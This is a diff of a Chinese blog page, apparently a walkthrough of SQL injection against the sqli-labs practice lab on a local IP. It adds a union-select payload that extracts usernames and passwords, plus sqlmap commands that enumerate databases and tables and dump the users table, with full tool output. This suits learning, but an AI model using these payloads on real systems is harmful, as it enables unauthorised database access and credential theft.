@@ -173,7 +173,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1k 字
+      1.8k 字
     </span>
   
 
@@ -183,7 +183,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      28
        分钟
     </span>
   
@@ -285,6 +285,152 @@
 <h2 id="值"><a href="#值" class="headerlink" title="值"></a>值</h2><pre><code class="hljs sql">http://192.168.43.160/sqli/Less-1/?id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">111</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">concat_ws</span>(<span class="hljs-built_in">char</span>(<span class="hljs-number">32</span>,<span class="hljs-number">58</span>,<span class="hljs-number">32</span>),<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>)),<span class="hljs-number">333</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-comment">--+</span></code></pre>
 
 <p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20200925161437.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h1><h2 id="枚举数据库"><a href="#枚举数据库" class="headerlink" title="枚举数据库"></a>枚举数据库</h2><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># sqlmap -u "http://192.168.43.160/sqli/Less-1/?id=1" --dbs --batch</span>
+
+
+[*] starting @ 06:36:55 /2020-09-28/
+
+[06:36:56] [INFO] resuming back-end DBMS <span class="hljs-string">'mysql'</span> 
+[06:36:56] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+...
+NULL,CONCAT(0x716a787071,0x486168517962555a684f4a69794e7244456e6a4e494c437a534175556163727a71736d74686d6f51,0x71717a6a71),NULL-- -
+---
+[06:36:58] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.0
+[06:36:58] [INFO] fetching database names
+[06:36:58] [INFO] resumed: <span class="hljs-string">'information_schema'</span>
+[06:36:58] [INFO] resumed: <span class="hljs-string">'challenges'</span>
+[06:36:58] [INFO] resumed: <span class="hljs-string">'dvwa'</span>
+[06:36:58] [INFO] resumed: <span class="hljs-string">'mysql'</span>
+[06:36:58] [INFO] resumed: <span class="hljs-string">'performance_schema'</span>
+[06:36:58] [INFO] resumed: <span class="hljs-string">'security'</span>
+[06:36:58] [INFO] resumed: <span class="hljs-string">'test'</span>
+available databases [7]:                                                                                                             
+[*] challenges
+[*] dvwa
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] security
+[*] <span class="hljs-built_in">test</span></code></pre>
+
+<h2 id="枚举表"><a href="#枚举表" class="headerlink" title="枚举表"></a>枚举表</h2><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># sqlmap -u "http://192.168.43.160/sqli/Less-1/?id=1" -D security --tables --batch</span>
+
+
+[*] starting @ 06:40:06 /2020-09-28/
+
+[06:40:06] [INFO] resuming back-end DBMS <span class="hljs-string">'mysql'</span> 
+[06:40:06] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+...
+---
+[06:40:08] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.0
+[06:40:08] [INFO] fetching tables <span class="hljs-keyword">for</span> database: <span class="hljs-string">'security'</span>
+[06:40:08] [INFO] resumed: <span class="hljs-string">'emails'</span>
+[06:40:08] [INFO] resumed: <span class="hljs-string">'referers'</span>
+[06:40:08] [INFO] resumed: <span class="hljs-string">'uagents'</span>
+[06:40:08] [INFO] resumed: <span class="hljs-string">'users'</span>
+Database: security                                                                                                                   
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+</code></pre>
+
+<p>到这里没有必要穷举列了，直接 –dump 出来就好了</p>
+<pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># sqlmap -u "http://192.168.43.160/sqli/Less-1/?id=1" -D security -T users --columns --dump --batch</span>
+
+
+[*] starting @ 06:43:52 /2020-09-28/
+
+[06:43:52] [INFO] resuming back-end DBMS <span class="hljs-string">'mysql'</span> 
+[06:43:52] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+..
+---
+[06:43:54] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.0
+[06:43:54] [INFO] fetching columns <span class="hljs-keyword">for</span> table <span class="hljs-string">'users'</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">'security'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'id'</span>,<span class="hljs-string">'int(3)'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'username'</span>,<span class="hljs-string">'varchar(20)'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'password'</span>,<span class="hljs-string">'varchar(20)'</span>
+Database: security                                                                                                                   
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+
+
+[06:43:54] [INFO] fetching columns <span class="hljs-keyword">for</span> table <span class="hljs-string">'users'</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">'security'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'id'</span>,<span class="hljs-string">'int(3)'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'username'</span>,<span class="hljs-string">'varchar(20)'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'password'</span>,<span class="hljs-string">'varchar(20)'</span>
+[06:43:54] [INFO] fetching entries <span class="hljs-keyword">for</span> table <span class="hljs-string">'users'</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">'security'</span>                                                          
+[06:43:54] [INFO] resumed: <span class="hljs-string">'1'</span>,<span class="hljs-string">'Dumb'</span>,<span class="hljs-string">'Dumb'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'2'</span>,<span class="hljs-string">'I-kill-you'</span>,<span class="hljs-string">'Angelina'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'3'</span>,<span class="hljs-string">'p@ssword'</span>,<span class="hljs-string">'Dummy'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'4'</span>,<span class="hljs-string">'crappy'</span>,<span class="hljs-string">'secure'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'5'</span>,<span class="hljs-string">'stupidity'</span>,<span class="hljs-string">'stupid'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'6'</span>,<span class="hljs-string">'genious'</span>,<span class="hljs-string">'superman'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'7'</span>,<span class="hljs-string">'mob!le'</span>,<span class="hljs-string">'batman'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'8'</span>,<span class="hljs-string">'admin'</span>,<span class="hljs-string">'admin'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'9'</span>,<span class="hljs-string">'admin1'</span>,<span class="hljs-string">'admin1'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'10'</span>,<span class="hljs-string">'admin2'</span>,<span class="hljs-string">'admin2'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'11'</span>,<span class="hljs-string">'admin3'</span>,<span class="hljs-string">'admin3'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'12'</span>,<span class="hljs-string">'dumbo'</span>,<span class="hljs-string">'dhakkan'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'14'</span>,<span class="hljs-string">'admin4'</span>,<span class="hljs-string">'admin4'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'15'</span>,<span class="hljs-string">'z1R!m1x!X0'</span>,<span class="hljs-string">'RYWmDdAG'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'16'</span>,<span class="hljs-string">'z4O!g8d!K2'</span>,<span class="hljs-string">'wgbDaJru'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'17'</span>,<span class="hljs-string">'r8N!r2m!H0'</span>,<span class="hljs-string">'MptMLPTl'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'18'</span>,<span class="hljs-string">'d9K!f2i!B2'</span>,<span class="hljs-string">'POyBldlB'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'19'</span>,<span class="hljs-string">'f3S!y2k!M4'</span>,<span class="hljs-string">'xztGNxJa'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'20'</span>,<span class="hljs-string">'t8U!e8i!Q9'</span>,<span class="hljs-string">'FZsbhWea'</span>
+[06:43:54] [INFO] resumed: <span class="hljs-string">'21'</span>,<span class="hljs-string">'x1M!a8a!E1'</span>,<span class="hljs-string">'NKtImiAx'</span>
+Database: security                                                                                                                   
+Table: users
+[20 entries]
++------+----------+------------+
+| id   | username | password   |
++------+----------+------------+
+| 1    | Dumb     | Dumb       |
+| 2    | Angelina | I-kill-you |
+| 3    | Dummy    | p@ssword   |
+| 4    | secure   | crappy     |
+| 5    | stupid   | stupidity  |
+| 6    | superman | genious    |
+| 7    | batman   | mob!le     |
+| 8    | admin    | admin      |
+| 9    | admin1   | admin1     |
+| 10   | admin2   | admin2     |
+| 11   | admin3   | admin3     |
+| 12   | dhakkan  | dumbo      |
+| 14   | admin4   | admin4     |
+| 15   | RYWmDdAG | z1R!m1x!X0 |
+| 16   | wgbDaJru | z4O!g8d!K2 |
+| 17   | MptMLPTl | r8N!r2m!H0 |
+| 18   | POyBldlB | d9K!f2i!B2 |
+| 19   | xztGNxJa | f3S!y2k!M4 |
+| 20   | FZsbhWea | t8U!e8i!Q9 |
+| 21   | NKtImiAx | x1M!a8a!E1 |
++------+----------+------------+
+
+[06:43:54] [INFO] table <span class="hljs-string">'`security`.users'</span> dumped to CSV file <span class="hljs-string">'/root/.local/share/sqlmap/output/192.168.43.160/dump/security/users.csv'</span>
+[06:43:54] [INFO] fetched data logged to text files under <span class="hljs-string">'/root/.local/share/sqlmap/output/192.168.43.160'</span>
+
+[*] ending @ 06:43:54 /2020-09-28/</code></pre>
+
 
             </div>
             <hr>
@@ -307,6 +453,12 @@
                 <div class="post-prevnext row">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2020/11/05/%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">常见名词解释</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
